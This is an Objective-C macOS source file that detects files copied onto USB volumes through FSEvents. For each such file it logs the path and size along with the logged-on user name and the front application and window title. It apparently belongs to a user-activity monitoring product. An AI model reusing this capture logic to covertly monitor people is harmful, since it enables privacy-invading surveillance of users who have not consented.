//
//  USBFileTransferDetection.m
//  USBFileTransferManager
//
//  Created by ophat on 2/4/15.
//  Copyright (c) 2015 ophat. All rights reserved.
//

#import "USBFileTransferDetection.h"

#import "DateTimeFormat.h"
#import "SystemUtilsImpl.h"
#import "FxFileTransferEvent.h"

static NSString *kOriginPath = @"/Volumes";

@interface USBFileTransferDetection (private)
-(void) mount:(NSNotification *)notification;
-(void) unmount:(NSNotification *)notification;
-(void) renameMount:(NSNotification *)notification;

-(void) removePathFromList:(NSString *)fullpath;
-(void) checkfile:(NSString *)path flag:(FSEventStreamEventFlags) flags;
-(void) watchThisPath:(NSString *) fileInputPath isFromUnmount:(Boolean)isFromUnmount;
@end

static void gotEvent(ConstFSEventStreamRef streamRef,
                     void* callBackInfo,
                     size_t numEvents,
                     void* eventPaths,
                     const FSEventStreamEventFlags eventFlags[],
                     const FSEventStreamEventId eventIds[]) {
    USBFileTransferDetection *mySelf = (USBFileTransferDetection *)callBackInfo;
    NSArray * paths = (__bridge NSArray*)eventPaths;
    for (int i=0; i< [paths count]; i++) {
        FSEventStreamEventFlags flags = eventFlags[i];
        NSString * path = [paths objectAtIndex:i];
        // Hidden folder/file check
        NSString *fileName = [path lastPathComponent];
        if (![fileName hasPrefix:@"."]) {
            [mySelf checkfile:path flag:flags];
        }
    }
}

@implementation USBFileTransferDetection

@synthesize mPathsToWatch;
@synthesize mStreamRef;
@synthesize mCurrentRunloopRef, mRecentFilePath, mRecentFileSize;

@synthesize mDelegate, mSelector;

#pragma mark - Public methods

-(void)startCapture{
    [self stopCapture];
    
    DLog(@"Start USBFileTransferDetection");
    self.mPathsToWatch = [NSMutableArray array];
    
    //==== Check if the External Storage is already attached.
    NSArray * vol = [[NSWorkspace sharedWorkspace] mountedRemovableMedia] ;
    if([vol count]>0){
        for (int i =0; i<[vol count]; i++) {
            DLog(@"No. %d Watch : %@",i,[vol objectAtIndex:i]);
            [self watchThisPath:[vol objectAtIndex:i] isFromUnmount:NO];
        }
    }
    
    //==== Add Notification For Storage attach/detach.
    [[[NSWorkspace sharedWorkspace] notificationCenter] addObserver:self  selector:@selector(mount:)  name:NSWorkspaceDidMountNotification  object:nil];
    [[[NSWorkspace sharedWorkspace] notificationCenter] addObserver:self  selector:@selector(unmount:)  name:NSWorkspaceDidUnmountNotification  object:nil];
    [[[NSWorkspace sharedWorkspace] notificationCenter] addObserver:self  selector:@selector(renameMount:)  name:NSWorkspaceDidRenameVolumeNotification  object:nil];
}

-(void)stopCapture{
    DLog(@"Stop USBFileTransferDetection");
    [[[NSWorkspace sharedWorkspace] notificationCenter]removeObserver:self name:NSWorkspaceDidMountNotification object:nil];
    [[[NSWorkspace sharedWorkspace] notificationCenter]removeObserver:self name:NSWorkspaceDidUnmountNotification object:nil];
    [[[NSWorkspace sharedWorkspace] notificationCenter]removeObserver:self name:NSWorkspaceDidRenameVolumeNotification object:nil];
    
    if (mStreamRef !=nil && mCurrentRunloopRef !=nil) {
        FSEventStreamUnscheduleFromRunLoop(mStreamRef, mCurrentRunloopRef, kCFRunLoopDefaultMode);
        FSEventStreamStop(mStreamRef);
        FSEventStreamRelease(mStreamRef);
    }
    
    self.mPathsToWatch = nil;
    self.mStreamRef = nil;
    self.mCurrentRunloopRef = nil;
    self.mRecentFilePath = nil;
    self.mRecentFileSize = 0;
}

#pragma mark - Private methods

-(void) renameMount:(NSNotification *)notification {
    NSDictionary *userInfo = [notification userInfo];
    NSString * fullpath = [NSString stringWithFormat:@"%@/%@",kOriginPath,[userInfo objectForKey:@"NSWorkspaceVolumeLocalizedNameKey"]];
    NSString * oldfullpath = [NSString stringWithFormat:@"%@/%@",kOriginPath,[userInfo objectForKey:@"NSWorkspaceVolumeOldLocalizedNameKey"]];
    
    DLog(@"===> Device Rename from %@ -> Watch %@",oldfullpath,fullpath);
    [self removePathFromList:oldfullpath];
    if ([[NSFileManager defaultManager] fileExistsAtPath:fullpath]) {
        [self watchThisPath:fullpath isFromUnmount:NO];
    }
}

-(void) mount:(NSNotification *)notification {
    NSDictionary *userInfo = [notification userInfo];
    NSString * fullpath = [userInfo objectForKey:@"NSDevicePath"];
    DLog(@"===> Device Added : Watch %@",fullpath);
    if ([[NSFileManager defaultManager] fileExistsAtPath:fullpath]) {
        [self watchThisPath:fullpath isFromUnmount:NO];
    }
}

-(void) unmount:(NSNotification *)notification {
    //**** !!!! The problem is the warning in fsevent faster than this notification
    NSDictionary *userInfo = [notification userInfo];
    NSString * fullpath = [userInfo objectForKey:@"NSDevicePath"];
    DLog(@"===> Device Removed : Watch %@",fullpath);
    [self removePathFromList:fullpath];
    [self watchThisPath:@"" isFromUnmount:YES];

}

-(void)removePathFromList:(NSString *)fullpath{
    //==== Find the path to remove
    int indexToRemove = -1;
    for (int i = 0; i < [mPathsToWatch count]; i++) {
        if([[mPathsToWatch objectAtIndex:i]isEqualToString:fullpath]){
            indexToRemove = i;
        }
    }
    
    //==== check index is found or not
    if (indexToRemove != -1) {
        //==== if it no more path to watch -> remove all object else remove the selected
        if (([mPathsToWatch count]-1) == 0) {
            [mPathsToWatch removeAllObjects];
        }else{
            NSMutableArray * temp = [[NSMutableArray alloc]init];
            for (int i=0 ; i<[mPathsToWatch count]; i++) {
                if (i != indexToRemove) {
                    [temp addObject:[mPathsToWatch objectAtIndex:i]];
                }
            }
            
            self.mPathsToWatch = [[temp mutableCopy] autorelease];
            [temp release];
        }
    }
}

-(void) checkfile:(NSString *)path flag:(FSEventStreamEventFlags) flags{
    NSFileManager * fileManager = [NSFileManager defaultManager];
    if((flags & kFSEventStreamEventFlagItemCreated) || (flags & kFSEventStreamEventFlagItemRenamed) ||
       (flags & kFSEventStreamEventFlagItemModified) ){
        NSString * sym =@"";
        if (flags & kFSEventStreamEventFlagItemCreated) {
            sym =@"Created";
        }else if (flags & kFSEventStreamEventFlagItemRenamed) {
            sym =@"Renamed";
        }else if (flags & kFSEventStreamEventFlagItemModified) {
            sym =@"Modified";
        }
        BOOL isDir = NO;
        if([fileManager fileExistsAtPath:path isDirectory:&isDir] && !isDir){
            NSDictionary *attrs = [fileManager attributesOfItemAtPath: path error: NULL];
            unsigned long long filesize = [attrs fileSize];
            if (filesize > 0) {
                
                // Capture whatever here
                DLog(@"%@: %@ (%@) size :%llu",sym,path,[path lastPathComponent],filesize);
                
                /*
                 KNOWN ISSUE:
                    When there is duplicate call back, there always is the same file name but different file size.
                    Some big file could have call back more than one time with different file size.
                */
                 
                if ([mDelegate respondsToSelector:mSelector] &&
                    (![self.mRecentFilePath isEqualToString:path] || self.mRecentFileSize != filesize)) {
                    self.mRecentFileSize = filesize;
                    self.mRecentFilePath = path;
                    
                    FxFileTransferEvent *fileTransferEvent = [[FxFileTransferEvent alloc] init];
                    [fileTransferEvent setDateTime:[DateTimeFormat phoenixDateTime]];
                    [fileTransferEvent setMDirection:kEventDirectionIn];
                    [fileTransferEvent setMUserLogonName:[SystemUtilsImpl userLogonName]];
                    [fileTransferEvent setMApplicationID:[SystemUtilsImpl frontApplicationID]];
                    [fileTransferEvent setMApplicationName:[SystemUtilsImpl frontApplicationName]];
                    [fileTransferEvent setMTitle:[SystemUtilsImpl frontApplicationWindowTitle]];
                    [fileTransferEvent setMTransferType:kFileTransferTypeUSB];
                    [fileTransferEvent setMSourcePath:nil];
                    [fileTransferEvent setMDestinationPath:path];
                    [fileTransferEvent setMFileName:[path lastPathComponent]];
                    [fileTransferEvent setMFileSize:(int)filesize];
                    [mDelegate performSelector:mSelector withObject:fileTransferEvent];
                    [fileTransferEvent release];
                    
                }
            }
        }
    }
}

-(void) watchThisPath:(NSString *) fileInputPath isFromUnmount:(Boolean)isFromUnmount{

    if (!isFromUnmount) {
        if ([mPathsToWatch count]>0) {
            if ([[mPathsToWatch objectAtIndex:0]isEqualToString:kOriginPath]) {
                [mPathsToWatch removeAllObjects];
            }
        }
        [mPathsToWatch addObject:fileInputPath];
    }
    
    FSEventStreamContext context;
    context.info = (__bridge void *)(self);
    context.version = 0;
    context.retain = NULL;
    context.release = NULL;
    context.copyDescription = NULL;
    
    if (mStreamRef !=nil && mCurrentRunloopRef !=nil) {
        FSEventStreamUnscheduleFromRunLoop(mStreamRef, mCurrentRunloopRef, kCFRunLoopDefaultMode);
        FSEventStreamStop(mStreamRef);
        FSEventStreamRelease(mStreamRef);
        self.mStreamRef = nil;
    }
    
    if([mPathsToWatch count]>0){
        mCurrentRunloopRef = CFRunLoopGetCurrent();
        mStreamRef = FSEventStreamCreate(NULL,
                                         &gotEvent,
                                         &context,
                                         (__bridge CFArrayRef) mPathsToWatch,
                                         kFSEventStreamEventIdSinceNow,
                                         1.0,
                                         kFSEventStreamCreateFlagWatchRoot | kFSEventStreamCreateFlagUseCFTypes | kFSEventStreamCreateFlagFileEvents
                                         );
        
        FSEventStreamScheduleWithRunLoop(mStreamRef, mCurrentRunloopRef, kCFRunLoopDefaultMode);
        FSEventStreamStart(mStreamRef);
        DLog(@"Watch mPathsToWatch %@", self.mPathsToWatch);
    }
}

-(void)dealloc{
    [self stopCapture];
    [super dealloc];
}

@end
